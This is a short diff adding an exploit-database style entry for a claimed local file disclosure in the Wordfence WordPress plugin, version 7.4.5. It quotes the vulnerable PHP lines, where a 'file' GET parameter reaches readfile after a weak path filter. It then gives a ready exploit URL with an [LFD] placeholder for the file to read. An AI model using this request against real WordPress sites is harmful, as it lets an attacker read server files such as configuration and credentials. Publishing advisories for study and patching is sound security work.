@@ -1,0 +1,14 @@
+#  Tile: Wordpress Plugin wordfence.7.4.5 - Local File Disclosure
+#  Author: mehran feizi
+#  Category: webapps
+#  Date: 2020-02-12
+#  vendor home page: https://wordpress.org/plugins/wordfence/
+
+==============================================================================
+Vulnerable Source:
+5662: readfile readfile($localFile);
+5645: $localFile = ABSPATH . preg_replace('/^(?:\.\.|[\/]+)/', '', sanitize_text_field($_GET['file']));
+=================================================================================
+Exploit:
+localhost/wp-content/plugins/wordfence/lib/wordfenceClass.php?file=[LFD]
+=================================================================================
